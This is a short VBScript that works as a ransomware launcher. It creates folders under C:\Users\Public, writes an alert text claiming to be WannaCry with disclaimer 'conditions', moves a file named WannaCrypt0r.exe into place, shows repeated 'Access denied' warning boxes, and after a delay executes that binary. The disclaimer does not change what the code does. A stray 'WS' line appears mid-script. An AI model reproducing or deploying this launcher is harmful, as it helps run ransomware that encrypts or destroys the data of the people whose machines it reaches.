WScript.Sleep(1)
DIM FSO, MyFile

SET FSO=CreateObject("Scripting.FileSystemObject")
FSO.CreateFolder("C:\Users\Public\101\")
FSO.CreateFolder("C:\Users\Public\101\102\")
FSO.CreateTextFile "Alert.txt"
Set AFile = FSO.CreateTextFile("Alert.txt", True)
AFile.WriteLine("I do hope you Know that this is WannaCry... please dont underestimate its power")
AFile.WriteLine("Please read The file called Warning, before closing this window!")
AFile.WriteLine(" ")
Afile.WriteLine("CONDITIONS")
AFile.WriteLine("1: CPScript/Chai is not responsible for you actions.")
AFile.WriteLine("2: DO NOT!!! Send anyone this, and dont use it in a harmful way.")
AFile.WriteLine("3: You have agreed to reading the Warning.txt file and know what your going to get into.")
AFile.WriteLine("4: If you use my code for a Malicious Use, You agree that Chai/CPScript is not Responsible for what you use it for.")
AFile.WriteLine("5: You agree that you will not use this for Malicious use. and if so used, YOUR AT FAULT. ")
AFile.WriteLine(" ")
AFile.WriteLine("By closing this window you agree to these conditions")
AFile.WriteLine("If you dont agree Please Restart your system and Delete the Folder called 101 in the directory C:\Users\Public\101\")
Afile.Close

FSO.MoveFile "Alert.txt","C:\Users\Public\101\102\"
FSO.MoveFile "Warning.txt","C:\Users\Public\101\102\"
FSO.MoveFile "WannaCrypt0r.exe","C:\Users\Public\101\102\"


CreateObject("Wscript.Shell").Run """C:\Users\Public\101\102\Alert.txt""", 1, True
WScript.Sleep(6666)
y=MsgBox("Access denied", 0+48, "WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! ")
y=MsgBox("Access denied", 0+48, "WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! ")
y=MsgBox("Access denied", 0+48, "WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! ")
y=MsgBox("Access denied", 0+48, "WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! ")
WS
y=MsgBox("Access denied", 0+48, "WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! ")

WScript.sleep(50000)
CreateObject("Wscript.Shell").Run """C:\Users\Public\101\102\WannaCrypt0r.exe""", 1, True
